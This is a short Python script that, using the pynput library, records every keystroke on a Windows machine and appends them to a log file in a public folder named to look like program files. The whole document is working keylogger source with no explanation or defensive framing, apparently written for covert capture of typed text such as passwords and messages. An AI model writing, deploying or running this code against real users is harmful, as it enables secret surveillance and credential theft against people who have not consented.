from pynput.keyboard import Key, Listener
import logging
from queue import Queue

log_dir = r"C:\Users\Public\ProgFiles"
extend = "\\"
Buffer = []

logging.basicConfig(filename=(log_dir + extend + 'log.txt'), filemode='a', level=logging.DEBUG, format='%(message)s') 

def on_press(key):
    try: Buffer.append(key.char)
    except:
        logging.info("".join(Buffer) + "\n")
        logging.info(key.name)
        Buffer.clear()

with Listener(on_press=on_press) as Listener:
    Listener.join()
